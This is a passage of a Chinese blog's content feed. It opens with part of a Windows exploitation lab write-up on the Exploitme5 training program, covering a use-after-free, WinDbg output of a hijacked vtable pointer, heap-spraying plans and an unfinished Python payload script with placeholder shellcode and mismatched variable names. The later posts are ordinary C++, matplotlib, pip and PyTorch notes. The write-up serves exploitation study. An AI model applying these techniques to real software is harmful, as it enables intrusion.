class="line">----------------------</span><br><span class="line">Index of block to <span class="built_in">duplicate</span> (<span class="number">-1</span> to exit): <span class="number">0</span> <span class="comment">// 选择我们准备好的block</span></span><br><span class="line">Number of <span class="built_in">copies</span> (<span class="number">-1</span> to exit): <span class="number">1</span>	<span class="comment">// 1份</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Your choice [<span class="number">1</span><span class="number">-6</span>]:<span class="number">2</span>	<span class="comment">// 再次查看所有的块</span></span><br><span class="line">------- Blocks -------</span><br><span class="line">block <span class="number">0</span>: address = <span class="number">0x00d8b138</span>; size = <span class="number">168</span></span><br><span class="line">block <span class="number">1</span>: address = <span class="number">0x00d864a0</span>; size = <span class="number">168</span>	<span class="comment">// 发现新block中的data地址，和上面被删除的multiplier对象地址相同	</span></span><br><span class="line">----------------------</span><br><span class="line">...</span><br><span class="line">Your choice [<span class="number">1</span><span class="number">-6</span>]:<span class="number">6</span></span><br></pre></td></tr></table></figure>

<p>payload成功占据了mutators[0]所指对象的空间，劫持成功。</p>
<p>如果继续执行变换，windbg中报错信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(5504.23e8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=010c6318 ebx=00dcc000 ecx=010c64a0 edx=00000000 esi=61616161 edi=761ee410</span><br><span class="line">eip=008a1972 esp=00bffe98 ebp=00bffeac iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293</span><br><span class="line">Exploitme5!mutateBlock+0x112:</span><br><span class="line">008a1972 ff5604          call    dword ptr [esi+4]    ds:002b:61616165=????????</span><br></pre></td></tr></table></figure>

<p>可以看到虚指针被覆盖。</p>
<h3 id="构造shellcode"><a href="#构造shellcode" class="headerlink" title="构造shellcode"></a>构造shellcode</h3><p>我们需要将虚指针指向构造好的虚表，需表中存储指向shellcode的指针。</p>
<h4 id="确定虚函数在虚表中的位置"><a href="#确定虚函数在虚表中的位置" class="headerlink" title="确定虚函数在虚表中的位置"></a>确定虚函数在虚表中的位置</h4><p>通过以下命令，确定虚函数mutate()的地址在虚表中的位置：在第4-7个字节处</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dd mutators</span><br><span class="line"><span class="number">008</span>a5454  <span class="number">00</span>c964a0 <span class="number">00</span>c96ce8 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a5464  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a5474  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a5484  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a5494  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a54a4  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a54b4  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a54c4  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt Multiplier <span class="number">00</span>c964a0	<span class="comment">// mutators[0]</span></span><br><span class="line">Exploitme5!Multiplier</span><br><span class="line">   +<span class="number">0x000</span> __VFN_table : <span class="number">0x008a34f8</span> </span><br><span class="line">   +<span class="number">0x004</span> param            : <span class="number">0</span>n2</span><br><span class="line">   +<span class="number">0x008</span> reserved         : [<span class="number">40</span>] <span class="number">0</span>n<span class="number">-1163005939</span></span><br><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dd <span class="number">0x008a34f8</span>			<span class="comment">// mutators[0]的虚指针</span></span><br><span class="line"><span class="number">008</span>a34f8  <span class="number">008</span>a1260 <span class="number">008</span>a1270 <span class="number">00000000</span> <span class="number">008</span>a37a8</span><br><span class="line"><span class="number">008</span>a3508  <span class="number">008</span>a1260 <span class="number">008</span>a12b0 <span class="number">000000</span>c0 <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a3518  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a3528  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a3538  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a3548  <span class="number">00000000</span> <span class="number">008</span>a5008 <span class="number">008</span>a3838 <span class="number">00000001</span></span><br><span class="line"><span class="number">008</span>a3558  <span class="number">008</span>a3118 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a3568  <span class="number">00000100</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; u <span class="number">008</span>a1270	<span class="comment">// 虚函数表中的第二个函数指针（第4-7个字节），是我们需要劫持的mutate()的地址</span></span><br><span class="line">Exploitme5!Multiplier::mutate [D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme5\Exploitme5.cpp @ <span class="number">19</span>]:</span><br><span class="line"><span class="number">008</span>a1270 <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">008</span>a1271 <span class="number">8b</span>ec            mov     ebp,esp</span><br><span class="line"><span class="number">008</span>a1273 <span class="number">8b</span>450c          mov     eax,dword ptr [ebp+<span class="number">0</span>Ch]</span><br><span class="line"><span class="number">008</span>a1276 <span class="number">99</span>              cdq</span><br><span class="line"><span class="number">008</span>a1277 <span class="number">83e203</span>          <span class="keyword">and</span>     edx,<span class="number">3</span></span><br><span class="line"><span class="number">008</span>a127a <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">008</span>a127b <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">008</span>a127c <span class="number">33f</span>6            <span class="keyword">xor</span>     esi,esi</span><br></pre></td></tr></table></figure>

<p>现在的问题在于，我们不知道该让vt_ptr指向哪里。我们可以将虚表和<code>shellcode</code>写到<code>buf.dat</code>文件中，并读入到块中。但由于<code>ASLR</code>我们无法确定<code>buf.dat</code>对应块的地址。</p>
<h4 id="Heap-Spraying确定虚指针"><a href="#Heap-Spraying确定虚指针" class="headerlink" title="Heap Spraying确定虚指针"></a>Heap Spraying确定虚指针</h4><p>我们可以使用<code>Heap Spraying</code>的方法，保证某个地址一定存储了我们需要的虚表+<code>shellcode</code>，然后我们把这个地址赋值给虚表指针即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">with open(&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;, &quot;wb&quot;) as f:</span><br><span class="line">    obj1_addr = 0x00c964a0</span><br><span class="line"></span><br><span class="line">    shellcode = b&quot;...&quot;</span><br><span class="line">    vt_ptr = struct.pack(&quot;&lt;I&quot;, obj_addr + 4)</span><br><span class="line">    vt = b&quot;a&quot;*4 + struct.pack(&quot;&lt;I&quot;, obj_addr + 12)</span><br><span class="line"></span><br><span class="line">    payload = vt_ptr + vt + shellcode</span><br><span class="line">    f.write(b&#x27;a&#x27;*168)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
  <entry>
    <title>Learning-C++</title>
    <url>/2023/10/29/Learning-Cpp/overview/</url>
    <content><![CDATA[<p>c++学习笔记。</p>
<span id="more"></span>

<h2 id="基础新特性"><a href="#基础新特性" class="headerlink" title="基础新特性"></a>基础新特性</h2><ul>
<li><p>命名空间 namespace</p>
</li>
<li><p>类型增强</p>
<ul>
<li><p>常量</p>
<ul>
<li><p>const</p>
<ul>
<li><p>常量指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span>* p = <span class="string">&quot;hello world&quot;</span>; <span class="comment">// const char* == char const*</span></span><br><span class="line">p[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span>; <span class="comment">// 出错，常量指针，指向的是常量，无法通过常量指针修改所指内容</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>指针常量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="type">const</span> p = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">p++; <span class="comment">// 出错，指针常量，无法修改p的值</span></span><br><span class="line">p[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span>; <span class="comment">// 但可以修改所指向的内容</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>constexpr: 编译时求值</p>
</li>
</ul>
</li>
<li><p>bool</p>
</li>
<li><p>enum</p>
</li>
<li><ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li><p>运算符重载</p>
<ul>
<li>方便混合处理多种类型不同的值</li>
</ul>
</li>
<li><p>变量初始化</p>
<ul>
<li>除了“&#x3D;”，还可以使用 <code>&#123;&#125;</code>和<code>()</code>进行初始化</li>
</ul>
</li>
<li><p>auto</p>
<ul>
<li>编译期，自动类型推断</li>
</ul>
</li>
<li><p>范围for语句</p>
<ul>
<li><pre><code class="c">for(auto x : v) &#123;&#125; // 存在内存复制操作
for(auto &amp;x : v) &#123;&#125; // 省去了内存复制操作
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- new/delete</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    指针变量名 = new 类型名; // delete p;</span><br><span class="line">    指针变量名 = new 类型名(初值); // delete p;</span><br><span class="line">    指针变量名 = new 类型名[变量个数];	// delete[] p;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
<li><p>nullptr</p>
<ul>
<li>NULL : int 0</li>
<li>nullptr : std::nullptr_t | void * 0</li>
<li>nullptr &#x3D;&#x3D; NULL &#x3D;&#x3D; 0 √</li>
</ul>
</li>
<li><p>强制类型转换</p>
<ul>
<li>static_cast</li>
<li>dynamic_cast</li>
<li>const_cast</li>
<li>reinterpret_cast</li>
</ul>
</li>
</ul>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul>
<li><p>不占用内存，编译时转换为寄存器赋值</p>
</li>
<li><p>变量与引用的隐式转换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int a = 10;</span><br><span class="line">int &amp;a1 = a; // 同一个变量，一般不额外占内存：变量-&gt;引用</span><br><span class="line">int &amp;a2 = a1; // 仍是同一个变量</span><br><span class="line">int b = a; // 创建新变量：变量-&gt;变量</span><br><span class="line">int b1 = a1; // 创建新变量：引用-&gt;变量</span><br></pre></td></tr></table></figure>
</li>
<li><p>普通引用和常量引用</p>
<ul>
<li>不能通过常量引用修改变量</li>
<li>作函数参数时，常量引用可以接收普通引用，但普通引用不能接收常量引用(常量)</li>
</ul>
</li>
</ul>
<h2 id="结构体和类"><a href="#结构体和类" class="headerlink" title="结构体和类"></a>结构体和类</h2><ul>
<li><p>结构体struct</p>
<ul>
<li>除了成员变量，还可以拥有成员函数</li>
</ul>
</li>
<li><p>权限修饰符</p>
<ul>
<li>public</li>
<li>protected</li>
<li>private</li>
</ul>
</li>
<li><p>类class</p>
<ul>
<li>和结构体十分类似</li>
<li>区别：结构体各成员默认public 类各成员默认private</li>
</ul>
</li>
<li><p>代码组织结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">student.h ：类Student的定义</span><br><span class="line">student.cpp ：#include &quot;student.h&quot; + 类Student的定义</span><br><span class="line">other.cpp : #include &quot;student.h&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="函数新特新"><a href="#函数新特新" class="headerlink" title="函数新特新"></a>函数新特新</h2><ul>
<li><p>后置返回类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto func(int, int);</span><br><span class="line">auto func(int, int) -&gt; int &#123;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>inline内联函数</p>
<ul>
<li>普通函数的定义一般放在.cpp文件，inline函数可以直接放在.h文件中（普通函数只能定义一次，但内联函数可以多次定义(得一致)）</li>
<li>函数体代替函数调用，节省简单函数的调用开销</li>
</ul>
</li>
<li><p>函数参数</p>
<ul>
<li><p>默认参数</p>
</li>
<li><p>空参，空着或者 void</p>
</li>
</ul>
</li>
<li><p>函数重载</p>
<ul>
<li><p>函数允许同名，但函数类型或参数要有明显区别</p>
</li>
<li><p>比较函数类型时，const关键字会被忽略</p>
</li>
</ul>
</li>
<li><p>成员函数修饰</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">XXX</span> &#123;</span><br><span class="line">	<span class="type">int</span> param;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">getParam</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="comment">// const 表示该函数执行过程中不会修改类的成员变量</span></span><br><span class="line">    <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="标准库"><a href="#标准库" class="headerlink" title="标准库"></a>标准库</h2><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><blockquote>
<p>可变长字符串</p>
</blockquote>
<ul>
<li><p>初始化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string s1;</span><br><span class="line">string s2 = &quot;hello world&quot;;</span><br><span class="line">string s3 = s2; // 存在拷贝</span><br><span class="line">string s4(&quot;hello world&quot;);</span><br><span class="line">string s5(6, &#x27;a&#x27;); // 连续6个&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>常用方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.empty()</span><br><span class="line">.size() .length()</span><br><span class="line">.c_str() // 返回一个指向string对象内部内容（正规c字符串，以&#x27;\0&#x27;结尾）的指针</span><br><span class="line">for(auto c : s) // 支持范围for，c的类型是char</span><br><span class="line">for(auto &amp;c : s) // 可以修改s中的字符</span><br></pre></td></tr></table></figure>
</li>
<li><p>其它用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[] == &gt; &lt; + &gt;&gt; &lt;&lt;</span><br><span class="line">+ 存在隐式类型转换，可以处理混合类型</span><br><span class="line">  s1+&#x27;a&#x27; s1+&quot;a&quot;+“b&quot; 允许</span><br><span class="line">  &quot;abc&quot; + &quot;def&quot; + s2 不允许，先执行前两项的相加，但他们现在的类型无法相加</span><br><span class="line">  </span><br><span class="line">.touppper() // 针对char?</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><blockquote>
<p>可变长数组</p>
</blockquote>
<ul>
<li><p>不能装引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int &amp;&gt; v; // 出错，引用在需要的时候加载到寄存器中，不占用内存</span><br></pre></td></tr></table></figure>
</li>
<li><p>初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; strv1; <span class="comment">// string默认初值为“”，int默认初值为0</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title function_">strv2</span><span class="params">(strv1)</span>; <span class="comment">// 存在内容拷贝 ()内部是vector时尝试拷贝，是整数时，认为是元素个数</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title function_">strv3</span><span class="params">(<span class="number">10</span>)</span>; <span class="comment">// 10个空字符串</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; strv3 = str1; <span class="comment">// 存在内容拷贝</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; strv3 = &#123;<span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;bbb&quot;</span>, <span class="string">&quot;ccc&quot;</span>&#125;; <span class="comment">// c++11，使用初始化列表 &#123;&#125;内部数据一般被认为初始化列表，如果失败，可能会尝试认为它是元素个数。</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title function_">strv3</span><span class="params">(<span class="number">10</span>, <span class="string">&quot;abc&quot;</span>)</span>; <span class="comment">// 10个”abc</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>常用方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.empty()</span><br><span class="line">.size()</span><br><span class="line">.push_back()</span><br><span class="line">.insert(place_iter, value) // 返回一个指向被插入元素的迭代器，可能和第一个参数已经不一样了</span><br><span class="line"></span><br><span class="line">.clear()</span><br><span class="line">for(auto x : v) // 支持范围for</span><br><span class="line">for(auto &amp;x : v) // 注意不要在范围for中改变vector对象的大小</span><br></pre></td></tr></table></figure>
</li>
<li><p>其它用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[] == !=</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><blockquote>
<p>标准库中的每一个容器内都定义了相应的迭代器类型（包括iterator, reverse_iterator, const_iterator)</p>
<p>能够取代部分指针的作用，且更安全和优雅</p>
</blockquote>
<ul>
<li><p>成员函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.begin() // 返回一个指向容器第一个元素的iter  vector&lt;xxx&gt;::iterator</span><br><span class="line">.end() // 返回一个指向容器最后一个元素的后面的iter,不指向元素</span><br><span class="line">// 如果容器为空。则.begin() = .end(())</span><br><span class="line">.rbegin() // 返回一个指向容器最后一个元素的iter vector&lt;xxx&gt;::reverse_iterator</span><br><span class="line">.rend() // 返回一个指向容器第一个元素的前面的iter,不指向元素</span><br><span class="line">.cbegin() // 返回常量迭代器</span><br><span class="line">.cend() // c++ 11</span><br></pre></td></tr></table></figure>
</li>
<li><p>其它用法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">* -&gt; ++ -- == !=</span><br><span class="line">*iter : 返回iter所指向元素的 引用</span><br><span class="line">(*iter).num == iter-&gt;num : 类似指针，当迭代器iter指向结构体时，可以使用*iter返回结构提的引用，也可以直接使用iter-&gt; 访问结构体成员</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><ul>
<li><p>继承</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Mutator</span> &#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> param;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Mutator</span>(<span class="type">int</span> param) : <span class="built_in">param</span>(param) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">getParam</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> param;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mutate</span><span class="params">(<span class="type">void</span> *data, <span class="type">int</span> size)</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Multiplier</span> : <span class="keyword">public</span> Mutator &#123;</span><br><span class="line">	<span class="type">int</span> reserved[<span class="number">40</span>]; <span class="comment">// 现在没用到!</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Multiplier</span>(<span class="type">int</span> multiplier = <span class="number">0</span>) : <span class="built_in">Mutator</span>(multiplier) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mutate</span><span class="params">(<span class="type">void</span> *data, <span class="type">int</span> size)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="type">int</span> *ptr = (<span class="type">int</span> *)data;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size / <span class="number">4</span>; ++i)</span><br><span class="line">			ptr[i] *= <span class="built_in">getParam</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>虚函数、虚表与多态</p>
</li>
</ul>
<h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><ul>
<li><p>函数指针数组</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*funcPtr)</span><span class="params">()</span></span>; <span class="comment">// 定义函数指针类型</span></span><br><span class="line">funcPtr functions[] = &#123;...&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
  </entry>
  <entry>
    <title>Matploitlib</title>
    <url>/2023/11/04/Learning-Python/Matploitlib/</url>
    <content><![CDATA[<p>学习使用Matploitlib包绘制各类图形。</p>
<span id="more"></span>



<p>示例代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入绘制三维的模块</span></span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">20</span>,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制三维曲线</span></span><br><span class="line">axl = fig.add_subplot(<span class="number">221</span>,projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">theta = np.linspace(-<span class="number">4</span>*np.pi, <span class="number">4</span>*np.pi, <span class="number">500</span>)</span><br><span class="line">z = np.linspace(-<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>)</span><br><span class="line">r = z**<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">x = r*np.sin(theta)</span><br><span class="line">y = r*np.conj(theta)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法与绘制二维曲线图相同</span></span><br><span class="line">axl.plot(x,y,z)</span><br><span class="line">axl.set_xlabel(<span class="string">&#x27;x&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl.set_ylabel(<span class="string">&#x27;y&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl.set_zlabel(<span class="string">&#x27;z&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制三维散点图</span></span><br><span class="line">axl2 = fig.add_subplot(<span class="number">222</span>,projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = np.random.randn(<span class="number">500</span>)</span><br><span class="line">y = np.random.randn(<span class="number">500</span>)</span><br><span class="line">z = np.random.randn(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法与绘制二维曲线图相同</span></span><br><span class="line">axl2.scatter(x,y,z,c=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">axl2.set_xlabel(<span class="string">&#x27;x&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl2.set_ylabel(<span class="string">&#x27;y&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl2.set_zlabel(<span class="string">&#x27;z&#x27;</span>,fontsize=<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制三维曲面图</span></span><br><span class="line">axl3 = fig.add_subplot(<span class="number">223</span>,projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">x = np.linspace(-<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>)</span><br><span class="line">y = np.linspace(-<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>)</span><br><span class="line">x,y = np.meshgrid(x,y)</span><br><span class="line">z = np.sqrt(x**<span class="number">2</span> + y**<span class="number">2</span>)</span><br><span class="line">axl3.plot_surface(x,y,z,cmap=plt.cm.winter)</span><br><span class="line">axl3.set_xlabel(<span class="string">&#x27;x&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl3.set_ylabel(<span class="string">&#x27;y&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl3.set_zlabel(<span class="string">&#x27;z&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制三维条形图</span></span><br><span class="line">axl4 = fig.add_subplot(<span class="number">224</span>, projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> np.arange(<span class="number">0</span>,<span class="number">40</span>,<span class="number">10</span>):</span><br><span class="line">    x = np.arange(<span class="number">20</span>)</span><br><span class="line">    y = np.random.randn(<span class="number">20</span>)</span><br><span class="line">    axl4.bar(x,y,zs=z,zdir=<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">axl4.set_xlabel(<span class="string">&#x27;x&#x27;</span>,fontsize=<span class="number">15</span>)</span><br><span class="line">axl4.set_ylabel(<span class="string">&#x27;y&#x27;</span>,fontsize=<span class="number">15</span>)</span><br><span class="line">axl4.set_zlabel(<span class="string">&#x27;z&#x27;</span>,fontsize=<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learning-Python</category>
      </categories>
      <tags>
        <tag>Matpolitlib</tag>
      </tags>
  </entry>
  <entry>
    <title>PythonConfig</title>
    <url>/2023/11/06/Learning-Python/PythonConfig/</url>
    <content><![CDATA[<p>python相关的一些配置。</p>
<span id="more"></span>

<h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><p>换源</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> <span class="keyword">global</span>.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learning-Python</category>
      </categories>
  </entry>
  <entry>
    <title>pipreqs</title>
    <url>/2023/11/06/Learning-Python/pipreqs/</url>
    <content><![CDATA[<p>使用pipreqs快速生成python项目依赖列表requirements.txt。</p>
<span id="more"></span>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install pipreqs</span><br><span class="line">pipreqs . --encoding=utf8 --force</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learning-Python</category>
      </categories>
  </entry>
  <entry>
    <title>pytorch</title>
    <url>/2023/11/06/Learning-Python/pytorch/</url>
    <content><![CDATA[<p>pytorch和神经网络学习笔记。</p>
<span id="more"></span>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>官网地址：<a href="https://pytorch.org/get-started/locally/">Start Locally | PyTorch</a></p>
<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118</span><br></pre></td></tr></table></figure>

<p>如果网络老是中断，可以先从.whl文件安装torch</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install D:\Users\xxx\Downloads\torch-<span class="number">2.1</span><span class="number">.0</span>+cu118-cp311-cp311-win_amd64.whl</span><br></pre></td></tr></table></figure>

<p>然后在执行第一个命令，安装torchvision torchaudio。</p>
<h2 id="神经网络概述"><a href="#神经网络概述" class="headerlink" title="神经网络概述"></a>神经网络概述</h2><p>DNN (Deep Neural Network)、RNN (Recurrent Neural Network)、CNN (Convolutional Neural Network) 和图神经网络 (Graph Neural Network) 都是深度学习领域中常见的神经网络架构，它们各自适用于不同类型的数据和任务。以下是对每种神经网络的简要介绍：</p>
<ol>
<li>深度神经网络 (DNN):<ul>
<li>DNN是一种标准的前馈神经网络，它由输入层、多个隐藏层和输出层组成。</li>
<li>DNN广泛用于图像分类、文本分类、回归、语音识别等任务。</li>
<li>深层结构允许DNN从数据中自动学习高级特征表示，从而提高性能。</li>
</ul>
</li>
<li>循环神经网络 (RNN):<ul>
<li>RNN是一种递归神经网络，具有循环连接，能够处理序列数据。</li>
<li>RNN具有内部状态，允许它记忆先前的信息并将其传递到后续时间步。</li>
<li>RNN常用于自然语言处理 (NLP)、时间序列分析、语音识别等需要考虑上下文的任务。</li>
</ul>
</li>
<li>卷积神经网络 (CNN):<ul>
<li>CNN是专门设计用于图像处理的神经网络。</li>
<li>它使用卷积层来检测图像中的特征，如边缘、纹理和形状。</li>
<li>CNN在计算机视觉任务中表现出色，如图像分类、目标检测和图像分割。</li>
</ul>
</li>
<li>图神经网络 (Graph Neural Network, GNN):<ul>
<li>GNN是为处理图数据而设计的神经网络，如社交网络、知识图谱和分子结构。</li>
